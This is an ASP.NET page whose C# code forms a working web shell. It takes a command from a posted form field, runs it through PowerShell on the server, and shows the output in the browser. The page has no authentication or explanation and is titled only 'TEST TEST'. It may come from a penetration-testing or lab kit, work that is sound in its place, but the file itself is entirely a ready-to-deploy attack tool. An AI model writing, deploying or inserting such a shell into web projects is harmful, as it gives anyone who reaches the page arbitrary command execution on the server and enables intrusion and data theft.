
<%@ Page Language="C#"%>
<%@ Import Namespace="System" %>
<script runat="server"  language="c#">
    string stdout = "";
    string stderr = "";
    void Page_Load(object sender, System.EventArgs e) {
        if (Request.Form["c"] != null)
        {
            try
            {
                var shell = System.Management.Automation.PowerShell.Create();
                shell.AddCommand(Request.Form["c"]);
                var result = shell.Invoke();
                foreach (var psObject in result)
                {
                    stdout += psObject.BaseObject.ToString() + "\r\n";
                }
            }
            catch (Exception ex)
            {
                stdout+= ex.ToString();
            }
        }
    }
</script>
<html>
<head><title>TEST TEST</title></head>
<body onload="document.shell.c.focus()">

<form method="post" name="shell">
Command to execute <input type="text" name="c"/>
<input type="submit"><br/>
Output:<br/>
<pre><% = stdout.Replace("<", "&lt;") %></pre>
<br/>
<br/>
<br/>
Error:<br/>
<pre><% = stderr.Replace("<", "&lt;") %></pre>
</form>
</body>
</html>
